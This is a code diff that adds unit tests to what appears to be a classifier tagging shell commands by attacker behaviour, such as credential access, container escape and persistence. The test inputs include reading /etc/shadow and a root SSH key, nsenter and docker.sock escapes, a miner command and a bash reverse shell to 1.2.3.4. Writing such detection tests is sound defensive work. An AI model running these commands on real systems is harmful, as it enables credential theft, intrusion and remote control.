@@ -167,6 +167,20 @@ class Commands(unittest.TestCase):
         self.assertIn("recon", self.tags("cat /proc/cpuinfo"))
         self.assertIn("recon-network", self.tags("ifconfig"))
 
+    def test_new_behavior_categories_for_unknown_families(self):
+        self.assertIn("process-discovery", self.tags("ps aux"))
+        self.assertIn("account-discovery", self.tags("cat /etc/passwd"))
+        self.assertIn("credential-access", self.tags("cat /etc/shadow"))
+        self.assertIn("credential-access", self.tags("cat /root/.ssh/id_ed25519"))
+        self.assertIn("container-escape", self.tags("nsenter --target 1 --mount"))
+        self.assertIn("container-escape", self.tags("ls -l /var/run/docker.sock"))
+        self.assertIn("persistence-systemd", self.tags("systemctl enable updater.service"))
+        self.assertNotIn("persistence-startup", self.tags("systemctl enable updater.service"))
+
+    def test_benign_lookalikes_do_not_trigger_new_categories(self):
+        for command in ("echo ps aux", "echo /etc/shadow", "systemctl status ssh", "ls /tmp"):
+            self.assertEqual(self.tags(command), [], command)
+
     def test_miner_and_reverse_shell(self):
         self.assertIn("miner", self.tags("./xmrig -o stratum+tcp://pool:3333"))
         self.assertIn("reverse-shell", self.tags("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
